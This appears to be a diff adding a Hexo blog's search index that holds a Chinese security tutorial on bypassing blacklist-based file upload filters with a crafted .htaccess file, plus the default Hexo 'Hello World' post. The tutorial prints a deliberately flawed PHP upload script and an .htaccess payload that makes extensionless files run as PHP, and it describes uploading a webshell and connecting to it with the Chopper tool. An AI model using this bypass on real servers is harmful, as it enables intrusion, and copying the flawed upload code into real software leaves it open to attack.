@@ -1,0 +1,67 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>.htaccess绕过黑名单上传</title>
+    <url>/2020/01/11/htaccess%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<sup>[1]</sup><br>在文件上传使用扩展名黑名单且没有过滤.htaccess的情况下，可以使用.htaccess文件绕过上传限制。</p>
+<a id="more"></a>
+<p>测试上传功能的代码如下：</p>
+<pre><code>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;form action=&quot;&quot; enctype=&quot;multipart/form-data&quot; method=&quot;POST&quot;&gt;
+&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;
+&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;upload&quot;&gt;
+&lt;/form&gt;
+&lt;?php 
+$black_list = array(&#39;html&#39;, &#39;htm&#39;, &#39;php&#39;, &#39;php2&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;txt&#39;);
+if(isset($_FILES[&#39;file&#39;]))
+{
+    $file_name = $_FILES[&#39;file&#39;][&#39;name&#39;];
+    $file_path = &#39;images/&#39; . $file_name;
+    $file_ext = substr($file_name, strrpos($file_name, &#39;.&#39;)+1);
+    $file_tmp = $_FILES[&#39;file&#39;][&#39;tmp_name&#39;];
+    foreach($black_list as $key=&gt;$value)
+    {
+        if($value == strtolower($file_ext))
+        {
+            echo &quot;不允许上传的文件类型！&quot;;
+            exit(0);
+        }
+    }
+
+    if(!move_uploaded_file($file_tmp, $file_path))
+    {
+        echo &quot;文件上传失败！&quot;;
+    }
+    else
+    {
+        echo &quot;文件上传成功，文件路径为&quot; . $file_path;
+    }
+}
+?&gt;</code></pre><p>新建.htaccess文件内容如下：</p>
+<pre><code>&lt;FilesMatch &quot;lala&quot;&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;</code></pre><p>上传该文件，由于文件扩展名不在黑名单中，所以可以上传成功：<br><img src="http://static.zybuluo.com/xmy2017/01ud0mg1ecckbsmvfgh0kjzk/1.png" alt="1.png-24.9kB"><br>接着上传一个文件名包含“lala”且没有扩展名一句话木马文件：<br><img src="http://static.zybuluo.com/xmy2017/tcu7n64hghwlnjpjclc6xeug/2.png" alt="2.png-25.2kB"><br>两个文件都能上传成功，使用菜刀连接lala文件：<br><img src="http://static.zybuluo.com/xmy2017/jnt9ctkvkwl3e5g62yvlze1k/3.png" alt="3.png-75.3kB"><br>所以在使用黑名单过滤且未包含htaccess扩展名的情况下，.htaccess通常是个大杀器。</p>
+<p>参考：<br>[1]百度百科：<a href="https://baike.baidu.com/item/htaccess/1645473" target="_blank" rel="noopener">https://baike.baidu.com/item/htaccess/1645473</a></p>
+]]></content>
+      <categories>
+        <category>文件上传</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2020/01/11/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre>
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre>
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+]]></content>
+  </entry>
+</search>
